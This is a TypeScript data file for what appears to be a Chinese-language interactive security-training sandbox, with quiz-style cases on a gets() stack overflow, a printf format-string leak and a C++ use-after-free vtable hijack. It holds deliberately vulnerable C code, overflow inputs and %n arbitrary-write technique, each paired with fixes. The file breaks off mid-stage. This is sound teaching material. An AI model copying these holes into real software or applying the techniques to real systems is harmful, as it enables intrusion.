/**
 * 在线沙箱案例数据 —— 纯前端仿真，无需下载任何文件。
 * 每个案例是一条「分析流程」：识别 → 线索 → 定位 → 验证 → 修复。
 * 每个阶段：材料展示 + 提问 + 全选项解释（对错都有解释，点错也能学到东西）。
 */

export type SandboxDifficulty = 'beginner' | 'basic' | 'intermediate' | 'advanced';

export type SandboxTool =
  | 'terminal'
  | 'strings'
  | 'decompile'
  | 'disasm'
  | 'gdb'
  | 'memory'
  | 'patch'
  | 'checksec'
  | 'exploit';

export interface SandboxOption {
  text: string;
  correct: boolean;
  /** 选中后的解释：答对讲透，答错也讲清为什么不对 */
  explain: string;
}

export interface SandboxStage {
  id: string;
  tool: SandboxTool;
  toolLabel: string;
  title: string;
  /** 本阶段任务（放在材料上方，让新手先知道要干嘛） */
  mission: string;
  material: string;
  materialLang: 'c' | 'cpp' | 'python' | 'bash' | 'asm' | 'plaintext';
  question: string;
  options: SandboxOption[];
  /** 指导模式：为什么要做这一步 */
  guideWhy: string;
  /** 指导模式：这份材料应该怎么看（特征/方法） */
  guideHow: string;
  /** 答对后的阶段小结 */
  verdict: string;
}

export interface SandboxCase {
  id: string;
  title: string;
  difficulty: SandboxDifficulty;
  difficultyLabel: '新手' | '低难度' | '中难度' | '高难度';
  vulnType: string;
  cwe: string;
  minutes: number;
  /** 案例背景故事 */
  brief: string;
  /** 你要完成的任务 */
  objective: string;
  stages: SandboxStage[];
  summary: string;
  protection: string[];
  relatedSteps: { label: string; href: string }[];
}

export const difficultyTone: Record<SandboxDifficulty, string> = {
  beginner: 'text-accent-green border-accent-green/40',
  basic: 'text-accent-cyan border-accent-cyan/40',
  intermediate: 'text-accent-orange border-accent-orange/40',
  advanced: 'text-accent-red border-accent-red/40',
};

export const sandboxCases: SandboxCase[] = [
  /* ============================================================
   * 新手区：gets() 栈溢出 —— 引导式闯关
   * ============================================================ */
  {
    id: 'sb-gets-overflow',
    title: '新手起步：gets() 栈溢出',
    difficulty: 'beginner',
    difficultyLabel: '新手',
    vulnType: 'CWE-120 缓冲区溢出',
    cwe: 'CWE-120',
    minutes: 15,
    brief:
      '程序 password_check 要求输入密码，输入正确才给你 flag。但它的作者犯了一个所有教材都会讲、真实世界却反复出现的错误 —— 我们一行密码都不用猜，就能直接拿到 shell。',
    objective:
      '跟着 5 个阶段走完一次完整的二进制漏洞分析：识别文件 → 找字符串线索 → 反编译定位漏洞 → 计算溢出偏移 → 验证利用并选出正确的修复方案。',
    stages: [
      {
        id: 's1',
        tool: 'terminal',
        toolLabel: '仿真终端 · file',
        title: '第一步：它是什么程序？',
        mission: '拿到未知二进制，先不运行它，用 file 命令读文件头，回答"这是什么"。看完材料回答下方问题。',
        material: `$ file password_check

password_check: ELF 64-bit LSB executable, x86-64,
version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped`,
        materialLang: 'bash',
        question: 'file 的输出里，对「接下来的逆向分析」帮助最大的信息是哪一条？',
        options: [
          {
            text: 'not stripped —— 符号表还在，反汇编时能直接看到函数名',
            correct: true,
            explain:
              '正确。未剥离符号意味着我们能直接看到 main、check_password 这些名字，分析难度直线下降。如果显示 stripped，就只能看到 FUN_00401132 这类占位名了。',
          },
          {
            text: '64-bit —— 说明这是 64 位程序',
            correct: false,
            explain:
              '这条信息正确且有用（64 位意味着参数走 rdi/rsi/rdx 寄存器、地址 8 字节），但它是背景知识，真正决定"从哪下手"的是符号有没有被剥离。',
          },
          {
            text: 'dynamically linked —— 需要系统库才能运行',
            correct: false,
            explain:
              '链接方式影响运行和漏洞利用（比如 ret2libc），但在静态分析阶段它帮不上忙，先放一边。',
          },
          {
            text: 'ELF —— 说明这是 Windows 程序',
            correct: false,
            explain:
              '反了。ELF 是 Linux/Unix 的标准可执行格式；Windows 的 .exe 是 PE 格式。认错平台会让后面的工具链全部选错。',
          },
        ],
        guideWhy:
          '拿到任何二进制，第一动作永远是"识别"而不是"运行"——未知程序直接跑有风险，而且 file 只读文件头，安全、快速，还能决定你后面用哪套工具。',
        guideHow:
          'file 输出里盯三处：① 架构（x86-64 → 用 64 位工具分析）；② 链接方式（dynamically/statically）；③ 有没有 stripped。对新手最友好的信号是 not stripped。',
        verdict:
          '确认目标：Linux x86-64 ELF 可执行文件，符号未剥离 —— 可以直接用函数名导航。下一步找线索。',
      },
      {
        id: 's2',
        tool: 'strings',
        toolLabel: '仿真终端 · strings',
        title: '第二步：字符串里有宝藏',
        mission: '不运行程序也能"偷看"它想说什么。strings 把二进制里所有可读字符串都列出来，危险功能经常留下文字痕迹。',
        material: `$ strings password_check | grep -iE "pass|flag|access|bin"

[?] Enter password:
[+] Access granted! Loading flag...
[-] Access denied!
/bin/sh`,
        materialLang: 'bash',
        question: '哪一行字符串最可疑，暗示程序里藏着一个"后门"？',
        options: [
          {
            text: '[+] Access granted! Loading flag...',
            correct: false,
            explain:
              '这是验证成功后的提示语。它告诉我们"成功后有事发生"，但提示语本身不是后门 —— 真正可疑的是另一个更具体的字符串。',
          },
          {
            text: '/bin/sh',
            correct: true,
            explain:
              '正确。/bin/sh 是启动一个 shell 的命令。一个"密码校验"程序里根本不需要它 —— 它的存在说明程序里有一段"验证通过就交出控制权"的隐藏分支。这就是我们要到达的目标。',
          },
          {
            text: '[-] Access denied!',
            correct: false,
            explain:
              '普通失败提示。值得记下来（之后调试时可以观察它），但它不指向任何危险功能。',
          },
          {
            text: '[?] Enter password:',
            correct: false,
            explain:
              '输入提示语。它告诉我们程序会读输入 —— 输入点很重要（攻击数据从这进），但"后门"另有其人。',
          },
        ],
        guideWhy:
          '逆向不是盲目啃汇编。字符串是程序行为的"自白书"：提示语、错误信息、甚至攻击者自己留下的痕迹都会以明文存在二进制里。',
        guideHow:
          '重点扫这些关键词：/bin/sh、flag、password、success、error。看到一个和程序功能不匹配的字符串（比如校验程序里有 /bin/sh），就是重大线索。',
        verdict:
          '重大发现：程序里存在 /bin/sh 字符串 —— 很可能藏着验证通过后启动 shell 的分支。下一步反编译确认。',
      },
      {
        id: 's3',
        tool: 'decompile',
        toolLabel: '仿真反编译器 · Ghidra 风格伪代码',
        title: '第三步：反编译，找到漏洞源头',
        mission: '把机器码还原成人话。阅读下面的伪代码，找出：漏洞在哪一行？为什么我们不需要知道密码？',
        material: `// password_check 反编译还原（简化）

void check_password(void) {
    char input[32];          // 32 字节的栈缓冲区
    int granted = 0;

    printf("[?] Enter password: ");
    gets(input);             // ★ 注意这里

    if (strcmp(input, "s3cr3t!") == 0) {
        granted = 1;
    }

    if (granted != 0) {
        printf("[+] Access granted!\\n");
        system("/bin/sh");   // 上一步找到的后门
    }
}`,
        materialLang: 'c',
        question: '漏洞出在哪一行？为什么密码对不对根本不重要？',
        options: [
          {
            text: 'gets(input) —— 不检查长度，溢出 input[32] 后能把栈上的 granted 一起改掉',
            correct: true,
            explain:
              '正确！gets 从标准输入读多少就写多少，完全不管 input 只有 32 字节。多出来的字节会顺着栈布局继续覆盖相邻变量 granted —— 只要把它从 0 覆盖成非 0，if (granted != 0) 直接成立。密码对比根本没赢过。',
          },
          {
            text: 'strcmp —— 密码比较函数有缺陷',
            correct: false,
            explain:
              'strcmp 只是逐字节比较两个字符串，本身不会越界。真正的源头是"数据怎么进来"的 gets。',
          },
          {
            text: 'printf("[?] Enter password: ") —— 格式化字符串漏洞',
            correct: false,
            explain:
              '看仔细：这里的格式串是写死在程序里的常量，参数也正常 —— 安全的。危险的是 printf(用户输入) 这种把数据当格式串的写法（进阶案例会专门玩这个）。',
          },
          {
            text: 'system("/bin/sh") —— 这一行本身就是漏洞',
            correct: false,
            explain:
              'system 调用确实是后门，但它只在 granted 非零时才执行，自己不会凭空运行。漏洞的"源头"是 gets，后门只是我们要"够到"的目标 —— 两者角色不同。',
          },
        ],
        guideWhy:
          '反编译拿到后，先找"输入从哪进来、存进多大的缓冲区"。危险输入函数 + 固定大小缓冲区 = 最经典的溢出组合，覆盖率极高。',
        guideHow:
          '背下这份危险函数名单：gets、strcpy、sprintf、strcat、scanf("%s")。看到它们旁边有个小数组（char input[32]），立即警觉：数据比缓冲区长会怎样？',
        verdict:
          '漏洞确认：gets(input) + char input[32] —— 用户输入可以越界，覆盖栈上紧邻的数据。下一步算清楚"要写多少字节才能正好碰到 granted"。',
      },
      {
        id: 's4',
        tool: 'memory',
        toolLabel: '仿真调试器 · 栈内存布局',
        title: '第四步：算偏移 —— 精确打击',
        mission: '溢出不是瞎写。根据栈布局算出：最少输入多少字节，能让 granted 从 0 变成非 0？',
        material: `check_password 的栈内存布局（从低地址到高地址）

  rbp-0x30  ┌──────────────────────────┐
            │  input[32]               │  32 字节
  rbp-0x10  ├──────────────────────────┤
            │  granted (int)           │   4 字节 ← if (granted != 0)
            │  （对齐填充）             │  12 字节
  rbp+0x00  ├──────────────────────────┤
            │  保存的 rbp              │   8 字节
  rbp+0x08  ├──────────────────────────┤
            │  返回地址                 │   8 字节
            └──────────────────────────┘

gets 从 input 的起点开始写，
写满 32 字节后会继续向高地址覆盖 granted、
保存的 rbp、返回地址……全部连成一片。`,
        materialLang: 'plaintext',
        question: '最少输入多少个字节，才能让 granted 从 0 变成非 0？',
        options: [
          {
            text: '32 字节',
            correct: false,
            explain:
              '差一步！32 字节刚好把 input 填满，最后一个字节还停在 input 里，granted 仍然是 0。',
          },
          {
            text: '33 字节',
            correct: true,
            explain:
              '正确！前 32 字节填满 input，第 33 字节正好落在 granted 的最低字节上。granted 变成 0x41（字符 A）—— 非 0，if (granted != 0) 成立，后门触发。',
          },
          {
            text: '41 字节',
            correct: false,
            explain:
              '41 字节当然也能触发（多覆盖了填充区），但题目问的是"最少"。精确计算偏移是漏洞利用的基本功 —— 多写的每个字节都可能踩坏不该踩的数据导致崩溃。',
          },
          {
            text: '72 字节',
            correct: false,
            explain:
              '那是覆盖到"返回地址"的偏移量 —— 属于劫持控制流级别的利用，威力更大但这一步还用不上。本案例的目标只是让 granted 非 0。',
          },
        ],
        guideWhy:
          '漏洞利用的核心是"精确偏移"：写少了碰不到目标，写多了可能破坏栈结构直接崩溃。学会看栈布局图，比背任何 payload 模板都重要。',
        guideHow:
          '数格子：从缓冲区起点（rbp-0x30）到目标变量（rbp-0x10）正好 32 字节。所以 32 字节填满 input，第 33 字节落在 granted 上。',
        verdict:
          '偏移确认：32 字节填满 input + 第 33 字节覆盖 granted。下一步实际验证，并决定怎么修。',
      },
      {
        id: 's5',
        tool: 'terminal',
        toolLabel: '仿真终端 · 验证 + 修复',
        title: '第五步：验证利用，选出正确的修复',
        mission: '先看攻击验证结果，然后切换视角：作为开发者，你会怎么修这个程序？',
        material: `$ ./password_check
[?] Enter password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
[+] Access granted! Loading flag...    ← 密码一个字母都没对
$ whoami
player                                 ← system("/bin/sh") 已执行

─────────────────────────────────────────
修复候选方案（选一个最合理的）：
A. 把 gets 换成 fgets(input, sizeof(input), stdin)
B. 把密码 "s3cr3t!" 改得更长更复杂
C. 删掉 system("/bin/sh") 这行后门
D. 在 gets 后面检查 granted 有没有被改`,
        materialLang: 'bash',
        question: '作为开发者，哪种修复方案才真正解决问题？',
        options: [
          {
            text: 'A：把 gets 换成 fgets(input, sizeof(input), stdin)，限制最多读取',
            correct: true,
            explain:
              '正确，这是治本。溢出的根源是"读取不设限"，fgets 强制上限后溢出源头直接消失。标准做法是 fgets + 限制长度，配合编译选项 -fstack-protector-strong 再加一层保险。',
          },
          {
            text: 'B：把密码改得更复杂',
            correct: false,
            explain:
              '密码强度和这个漏洞毫无关系 —— 我们的整个利用过程里，strcmp 那条路根本没被走过。',
          },
          {
            text: 'C：删掉 system("/bin/sh") 后门',
            correct: false,
            explain:
              '删后门确实减少了危害，但 gets 的溢出还在 —— 攻击者会转向覆盖返回地址、执行自己注入的代码。源头不修，漏洞一直在，只是换个玩法。',
          },
          {
            text: 'D：在 gets 后面检查 granted 是否被修改',
            correct: false,
            explain:
              '亡羊补牢且不可靠：检测逻辑本身也可能被绕过（比如攻击者直接覆盖返回地址）。安全修复的原则是消灭源头，而不是在下游捡漏。',
          },
        ],
        guideWhy:
          '修复漏洞有优先级：先治本（消除危险源头）→ 再加固（编译选项）→ 最后才是兜底检测。顺序反了就是给漏水的船刷漆。',
        guideHow:
          '对照危险函数速查表记忆"安全替身"：gets→fgets；strcpy→strncpy；sprintf→snprintf；strcat→strncat。再补编译选项 -fstack-protector-strong、-D_FORTIFY_SOURCE=2。',
        verdict:
          '修复方案确定：fgets 替换 gets + 编译加固。你已经完整走了一遍：识别 → 线索 → 定位 → 偏移 → 利用与修复！',
      },
    ],
    summary:
      '你完成了一次教科书级的栈溢出分析：不猜密码、不碰真实文件，在浏览器里走完了「识别 → 字符串线索 → 反编译定位 → 偏移计算 → 利用验证 → 修复决策」全流程。这套思维链条在真实工具（Ghidra、GDB、pwntools）里完全通用。',
    protection: [
      '用 fgets(buf, sizeof(buf), stdin) 替代 gets()，永远限制读取长度',
      '编译启用 -fstack-protector-strong（栈保护 Canary）',
      '编译启用 -D_FORTIFY_SOURCE=2，让危险函数在运行时做边界检查',
      '链接启用 NX 与 ASLR，让注入代码不可执行、地址不可预测',
      '代码审查重点：所有"输入函数 + 固定缓冲区"的组合',
    ],
    relatedSteps: [
      { label: '教学 · 静态分析', href: '/learn/step2' },
      { label: '教学 · 路径探索', href: '/learn/step3' },
      { label: '教学 · 防护策略', href: '/learn/step4' },
    ],
  },

  /* ============================================================
   * 进阶区 · 低难度：格式化字符串
   * ============================================================ */
  {
    id: 'sb-format-string',
    title: '格式化字符串泄露 · 中等难度',
    difficulty: 'basic',
    difficultyLabel: '低难度',
    vulnType: 'CWE-134 格式化字符串',
    cwe: 'CWE-134',
    minutes: 12,
    brief:
      '日志服务器把用户输入原样塞进日志。测试时有人输了一串 %x，屏幕上居然打出了内存地址。这个漏洞危险在你根本想不到 —— printf 的第一个参数不是内容，是指令。',
    objective:
      '通过 4 个阶段掌握格式化字符串漏洞：现象识别 → 源码定位 → 偏移探测 → 修复与编译期防护。',
    stages: [
      {
        id: 's1',
        tool: 'terminal',
        toolLabel: '仿真终端 · 运行观察',
        title: '第一步：%x 怎么会打出内存数据？',
        mission: '观察两次输入的程序行为差异，判断发生了什么。',
        material: `$ ./log_server

Input: hello
hello

Input: %x.%x.%x
64.7ffd1a2b3c40.0       ← 这些数字不是我们输入的！

Input: %p %p %p
0x40 (nil) 0x7ffd1a2b3c40   ← 直接打出了栈上的指针`,
        materialLang: 'bash',
        question: '输入 %x.%x.%x 后多出来的这串数字说明什么？',
        options: [
          {
            text: '用户输入被 printf 当成了格式字符串，%x 把栈上的数据泄露了出来',
            correct: true,
            explain:
              '正确！printf 拿到的第一个参数（格式串）是用户可控的，%x 会依次把栈上的数据当参数打印。这不仅能读内存（CWE-134），进一步用 %n 还能写内存。',
          },
          {
            text: '程序崩溃了',
            correct: false,
            explain:
              '没有崩溃 —— 程序"正常地"执行了 %x。这类漏洞的可怕之处恰恰是它安静：不崩、不报错，只是悄悄泄露数据。',
          },
          {
            text: '这是正常的回显功能',
            correct: false,
            explain:
              '正常回显只会原样输出 "%x.%x.%x" 这几个字符，绝不会打印 0x7ffd1a2b3c40 这种内存地址。',
          },
          {
            text: '有人注入了 shellcode',
            correct: false,
            explain:
              '还没有。目前只发生了"信息泄露"—— 这是利用的第一步（先摸清内存布局），离执行代码还有距离。',
          },
        ],
        guideWhy:
          '判断格式化字符串漏洞最快的办法就是"喂格式符"：输入一串 %x 或 %p，看输出有没有出现不该出现的内存数据。',
        guideHow:
          '%x / %p 会把栈上数据当参数打印。看到 0x7f… 开头的值，基本可以确定泄露到了栈指针 —— 攻击者最爱这种"地图"。',
        verdict:
          '现象确认：printf 把用户输入当格式串解析 —— 存在信息泄露。下一步去源码里找那一行。',
      },
      {
        id: 's2',
        tool: 'decompile',
        toolLabel: '仿真反编译器 · 源码定位',
        title: '第二步：危险写法 vs 安全写法',
        mission: '对比两段代码，理解为什么一个参数的位置决定了一切。',
        material: `// log_server 反编译片段（有漏洞）

void log_msg(char *user_input) {
    char local[64];
    strncpy(local, user_input, 63);
    local[63] = '\\0';
    printf(local);            // ← 问题在这一行
}

// ─────────── 修复后的写法 ───────────

void log_msg_fixed(char *user_input) {
    char local[64];
    strncpy(local, user_input, 63);
    local[63] = '\\0';
    printf("%s", local);      // 安全
}`,
        materialLang: 'c',
        question: '为什么 printf(local) 危险，而 printf("%s", local) 安全？',
        options: [
          {
            text: 'printf 的第一个参数是"格式说明"。printf(local) 让用户数据被当格式说明解析，%x/%n 这些"指令"就会执行；printf("%s", ...) 把格式说明固定成常量，local 只是被打印的数据',
            correct: true,
            explain:
              '完全正确。同一个数据，放在"参数位"是数据，放在"格式串位"就成了指令。漏洞的本质是两者的角色被混用。',
          },
          {
            text: 'local 数组太小，装不下用户输入',
            correct: false,
            explain:
              '数组大小与这个漏洞无关 —— strncpy 已经把输入限长到 63 字节了。就算 local 开得再大，printf(local) 一样危险。',
          },
          {
            text: 'printf 是被淘汰的旧函数',
            correct: false,
            explain:
              'printf 本身没有问题，问题在于用法。格式化输出本身是正当需求，标准修复继续用 printf，只是换了写法。',
          },
          {
            text: 'strncpy 没有补 \\0，导致越界读',
            correct: false,
            explain:
              '看代码第 4 行：local[63] 已经被手动补上了字符串终止符。而且"没补终止符"导致的是读取越界，不是格式符被执行 —— 根源还是格式串可控。',
          },
        ],
        guideWhy:
          '这是必须刻进肌肉记忆的铁律：格式串必须是程序里的常量。用户数据永远只能出现在 %s 的参数位置。',
        guideHow:
          '代码审查时 grep 一遍 printf( / syslog( / err( ，检查第一个参数是不是字面量。编译器也能帮这个忙 —— 最后一步会讲。',
        verdict:
          '根因定位：printf(local) 把用户输入放进了格式串位置。下一步演示如何从"读内存"升级到"写内存"。',
      },
      {
        id: 's3',
        tool: 'gdb',
        toolLabel: '仿真终端 · 偏移探测',
        title: '第三步：找到输入自己在栈上的位置',
        mission: '攻击者不只满足于"读"。观察探测输出，理解如何把漏洞升级成任意写。',
        material: `$ ./log_server

Input: AAAA|%p|%p|%p|%p|%p|%p|%p|%p

AAAA|0x40|0x7ffd1a2b3c40|(nil)|0x10|0x41414141|0x707c707c|0x707c707c|0x707c707c
                       ↑ 第 5 个 %p 吐出了 0x41414141 = "AAAA"

含义：我们的输入本身位于格式串的第 5 个参数位置。
于是 %5$n 可以向"第 5 个参数指向的地址"写入数据。`,
        materialLang: 'bash',
        question: '第 5 个 %p 打出 0x41414141，这个信息值千金。它告诉我们什么？',
        options: [
          {
            text: '我们的输入在格式串的第 5 个参数位置 —— 之后可以用 %5$n 精确写内存',
            correct: true,
            explain:
              '正确！%n 会把"目前已打印的字符数"写入对应参数指向的地址。既然知道输入自己在第 5 位，就能先在输入里放一个目标地址、再用 %5$n 往它写值 —— 任意写就成立了。',
          },
          {
            text: '程序里一共有 5 个漏洞',
            correct: false,
            explain:
              '数字 5 只是输入在参数列表里的位置序号，和漏洞数量没有任何关系。',
          },
          {
            text: '0x41414141 是某个系统函数的地址',
            correct: false,
            explain:
              '0x41 是字母 A 的 ASCII 码 —— 0x41414141 就是我们自己输入的 "AAAA"。它出现在第 5 个参数位置，恰恰说明输入本身被当成了参数。',
          },
          {
            text: '输入太长被截断了',
            correct: false,
            explain:
              '输出完整保留了 8 个 %p 的结果，没有截断。这个探测手法本身就是故意设计成"一看就懂"的。',
          },
        ],
        guideWhy:
          '从"任意读"升级到"任意写"，关键就是定位输入自己在参数列表里的序号 —— 这是格式化字符串利用的标志性一步。',
        guideHow:
          '固定套路：AAAA + 连续 %p 探测。看到 0x41414141 出现在第几个 %p，序号就是几。之后 %N$hn/%N$n 都以它为基准。',
        verdict:
          '偏移确认：输入位于第 5 参数位置，可升级为任意写。最后一步：修复 + 让编译器把关。',
      },
      {
        id: 's4',
        tool: 'patch',
        toolLabel: '仿真终端 · 补丁与编译选项',
        title: '第四步：修复，并让编译器帮你把关',
        mission: '看补丁 diff 和编译器输出，选出能在"代码改完之前"就拦截问题的手段。',
        material: `--- log_server.c (vulnerable)
+++ log_server.c (fixed)
@@ -3,6 +3,6 @@
 void log_msg(char *user_input) {
     char local[64];
     strncpy(local, user_input, 63);
     local[63] = '\\0';
-    printf(local);
+    printf("%s", local);
 }

$ gcc -Wformat-security -Werror=format-security log_server.c
log_server.c:7:5: error: format not a string literal [-Werror=format-security]
    7 |     printf(local);
      |     ^~~~~~~~~~~~~`,
        materialLang: 'bash',
        question: '以下哪种做法能在"代码还没改完"的情况下，先让编译器帮你把关？',
        options: [
          {
            text: '-Wformat-security 配合 -Werror=format-security，把非常量格式串直接变成编译错误',
            correct: true,
            explain:
              '正确！编译期拦截最省心 —— 每次构建都自动检查一遍。很多发行版默认开启；再配 -D_FORTIFY_SOURCE=2 还能限制 %n 的滥用。',
          },
          {
            text: '-O3 开最高优化',
            correct: false,
            explain:
              '优化等级影响性能和反汇编难度，但不检测格式串问题。该报的错 -O3 一个都不会报。',
          },
          {
            text: '-m32 编译成 32 位',
            correct: false,
            explain:
              '架构位数和格式化字符串漏洞无关 —— 32 位下这个洞照样存在，而且利用方式还略有不同。',
          },
          {
            text: '改成 puts(local) 就一劳永逸',
            correct: false,
            explain:
              'puts 不解析 % 符号，确实能避开这个洞 —— 但它不能格式化输出、还会自动补换行，场景受限。标准修复仍然是 printf("%s", ...)，本题要选的是"编译器把关"的手段。',
          },
        ],
        guideWhy:
          '安全修复讲究"双保险"：改代码治本，编译选项防复发。人总会犯错，把检查交给每次必然发生的构建过程。',
        guideHow:
          '记住这套组合拳：-Wformat-security（警告）→ -Werror=format-security（升级为错误）→ -D_FORTIFY_SOURCE=2（运行时加固）。',
        verdict:
          '修复完成：printf("%s", local) + 编译期强制检查。你已经掌握了从发现、利用到修复的格式化字符串完整链路。',
      },
    ],
    summary:
      '你确认了 printf 把用户输入当格式串的漏洞：从 %x 泄露现象，到源码根因，再到 %5$n 任意写的升级路径，最后用标准修复 + 编译期检查收尾。这是 CTF 和真实漏洞报告里出场率最高的漏洞类型之一。',
    protection: [
      '格式串永远用常量：printf("%s", buf)，绝不把用户数据放在第一个参数',
      '编译开启 -Wformat-security -Werror=format-security',
      '开启 -D_FORTIFY_SOURCE=2 限制 %n 的运行时行为',
      '代码审查重点排查 printf / syslog / err 一族函数的第一个参数来源',
      '静态扫描工具（CodeQL、Coverity）可自动检测 CWE-134',
    ],
    relatedSteps: [
      { label: '教学 · 静态分析', href: '/learn/step2' },
      { label: '教学 · 路径探索', href: '/learn/step3' },
    ],
  },

  /* ============================================================
   * 进阶区 · 中难度：UAF 虚表劫持
   * ============================================================ */
  {
    id: 'sb-uaf-vtable',
    title: 'UAF 虚表劫持 · 中高难度',
    difficulty: 'intermediate',
    difficultyLabel: '中难度',
    vulnType: 'CWE-416 释放后重用',
    cwe: 'CWE-416',
    minutes: 15,
    brief:
      'C++ 聊天服务器：断开连接后再发一条消息，程序偶尔会执行意料之外的命令。原因 —— free 没置 NULL，新连接 malloc 复用了同一块内存，把 User 对象的虚表悄悄换成攻击者的东西。',
    objective:
      '通过 4 个阶段掌握 Use-After-Free：识别 UAF 模式 → 理解虚函数调用的内存机制 → 调试验证内存被占 → 选择机制级修复。',
    stages: [
      {
        id: 's1',
        tool: 'decompile',
        toolLabel: '仿真反编译器 · C++ 逻辑还原',
        title: '第一步：认出 UAF 的固定模式',
        mission: '阅读还原后的 C++ 逻辑，找出"对象已死、指针还在用"的证据。',
        material: `// chat_server 反编译还原（简化）

class Handler {
public:
    virtual void handle(const char* msg);   // 虚函数
};

class AdminHandler : public Handler {
public:
    void handle(const char* msg) override {
        run_command(msg);                   // 有权限的处理者
    }
};

Handler* current = nullptr;

void disconnect() {
    delete current;        // ① 释放对象，current 没有置空！
}

void new_message(const char* msg) {
    alloc_notify_buffer(); // ② 处理新消息会分配新内存
    current->handle(msg);  // ③ 又通过 current 使用！
}`,
        materialLang: 'cpp',
        question: '漏洞的核心模式是哪一个？',
        options: [
          {
            text: 'delete 之后 current 没有置空，③ 处又通过悬挂指针调用了虚函数（UAF）',
            correct: true,
            explain:
              '正确！这就是教科书级的 UAF：new → 使用 → delete → 再次使用。② 处的 alloc_notify_buffer 还会分配新内存 —— 被释放的块很可能被新数据占住，③ 的调用就"接力"到了攻击者手里。',
          },
          {
            text: 'run_command 太危险，应该删掉',
            correct: false,
            explain:
              'run_command 确实是高权限函数，但它本身不是漏洞 —— 问题是有办法在一个已被释放的对象上把它"复活"。就算换成普通函数，控制流被劫持依然是灾难。',
          },
          {
            text: 'new_message 分配的内存太大',
            correct: false,
            explain:
              '分配大小不是重点，重点是"分配"这个动作 —— 它给了被释放内存被重新占用的机会。没有这一步，UAF 很难稳定利用。',
          },
          {
            text: 'C++ 虚函数表的设计有缺陷',
            correct: false,
            explain:
              'vtable 机制本身没有缺陷，它只是把"函数指针存在对象里"这件事摆到了明面上。真正的问题是程序允许"释放后再使用"而没有任何防护。',
          },
        ],
        guideWhy:
          'UAF 有固定的识别口诀：new → use → delete → use again。审查代码时盯住每一个 delete：指针死了吗？死后还有人用它吗？中间有没有分配新内存的机会？',
        guideHow:
          '反编译里看到 free/delete 后，顺着指针继续往下读；只要后面还有解引用 —— 尤其是虚调用 call qword ptr [reg] —— 就标记为 UAF 候选。',
        verdict:
          'UAF 模式确认：释放后未置空 + 二次使用 + 中间有分配机会。下一步搞清楚为什么虚函数调用会被劫持。',
      },
      {
        id: 's2',
        tool: 'memory',
        toolLabel: '内存布局 · 虚函数机制',
        title: '第二步：虚表劫持为什么成立',
        mission: '理解 h->handle(msg) 这一行在内存层面到底发生了什么。',
        material: `一个普通对象在内存里长这样：

h ──→ ┌──────────────────┐
      │ vptr (8字节)      │ ──→ AdminHandler 的虚函数表
      ├──────────────────┤       ┌────────────────────────────┐
      │ ...其他成员       │       │ [0] AdminHandler::handle   │ ──→ run_command
      └──────────────────┘       └────────────────────────────┘

current->handle(msg) 的真实执行过程：
  ① 读 current 指向内存的前 8 字节   → 得到 vptr
  ② 用 vptr 找到虚表，取第 [0] 项    → 得到函数地址
  ③ call 这个地址

关键：①②③ 全是"读内存 → 再读内存 → 跳转"。
谁能控制这块内存的内容，谁就能控制 ③ 跳去哪里。`,
        materialLang: 'plaintext',
        question: '如果攻击者在 delete 之后、new_message 之前，用可控数据占住这块内存，current->handle(msg) 会发生什么？',
        options: [
          {
            text: '① 读到的 vptr 是伪造的 → ② 取到伪造的函数地址 → ③ call 跳到攻击者指定的位置',
            correct: true,
            explain:
              '正确！这就是"虚表劫持"：多态调用的三次寻址全是读内存，内容被换掉，调用目标自然跟着换。攻击者只要把伪造 vptr 填进旧对象的内存，handle 就变成了"你说了算"。',
          },
          {
            text: '编译器检测到指针失效，拒绝编译',
            correct: false,
            explain:
              '这是运行时行为 —— 编译器只能检查类型和语法，无法知道"运行到第 ③ 步时这块内存还有没有效"。UAF 之所以危险，就是它完全绕过了编译期检查。',
          },
          {
            text: '程序会稳定崩溃，没有安全影响',
            correct: false,
            explain:
              '崩溃只是运气好。只要伪造的数据结构合法（vptr 指向可读内存、表项指向有效地址），程序不但不崩，还会"听话地"跳到攻击者选的地址。',
          },
          {
            text: '会调用回原来的 handle 函数',
            correct: false,
            explain:
              '原来的虚表内容早随对象一起"消失"了 —— 这块内存现在的内容由重新占住它的人决定。没有任何机制保证还读得到旧值。',
          },
        ],
        guideWhy:
          '虚函数调用 = 两次内存间接寻址（对象 → vptr → vtable → 函数）。C++ 的"多态"在内存层面就是这么朴实无华 —— 这也意味着控制内存 = 控制调用。',
        guideHow:
          '反编译里凡是有 call qword ptr [rax] 这种"从内存取地址再调用"的指令，都要问两个问题：这块内存谁可控？什么时候可控？',
        verdict:
          '虚表劫持原理明确：对象头 8 字节 vptr 就是攻击的靶心。下一步用调试器验证内存真的被占了。',
      },
      {
        id: 's3',
        tool: 'gdb',
        toolLabel: '仿真调试器 · GDB 验证',
        title: '第三步：上证据 —— 内存被谁占了？',
        mission: '漏洞报告要讲证据。在"再使用"的断点处检查对象内存，验证 UAF 成立。',
        material: `(gdb) break new_message
(gdb) run
Breakpoint 1, new_message (msg="sh") at chat_server.cpp:31

(gdb) x/1gx current                 ; 看对象头 8 字节
0x55555556aeb0: 0x4141414141414141  ; vptr 已经变成 'AAAAAAAA'！

(gdb) info heap                     ; （示意）堆块状态
  ADDR              SIZE   STATE
  0x55555556aeb0    0x30   ALLOCATED  ← 已被"新消息通知缓冲"重新占用`,
        materialLang: 'bash',
        question: 'x/1gx 显示对象头变成了 0x4141…，这个证据说明什么？',
        options: [
          {
            text: 'UAF 成立：释放后的内存已被攻击者可控数据占据，虚表劫持条件齐备',
            correct: true,
            explain:
              '正确！0x41 是我们注入的特征值。它出现在对象头的 vptr 位置，配合堆块状态 ALLOCATED，形成完整证据链：释放 → 被占 → 再使用时读到的全是攻击者数据。',
          },
          {
            text: '这是内存泄漏（memory leak）',
            correct: false,
            explain:
              '泄漏是"借了不还"（分配后永远不释放）；UAF 是"还了又用"（释放后还在访问）。两者的检测方法和危害形态都不同。',
          },
          {
            text: 'current 是野指针，但这和漏洞无关',
            correct: false,
            explain:
              '"悬挂指针/野指针"正是 UAF 的临床表现 —— 不能把它当成无关现象。指针指向的内存被释放后仍被解引用，这就是漏洞本身。',
          },
          {
            text: 'GDB 显示精度问题，可以忽略',
            correct: false,
            explain:
              'x/1gx 精确读取 8 字节，0x4141414141414141 不是显示误差 —— 它是实实在在写进内存的数据，而且值正好是字母 A 重复 8 次，来源一目了然。',
          },
        ],
        guideWhy:
          '漏洞报告的生命线是"可复现证据"。在错误发生点抓现场（断点 + 内存检查），才能把 UAF 从猜测变成结论。',
        guideHow:
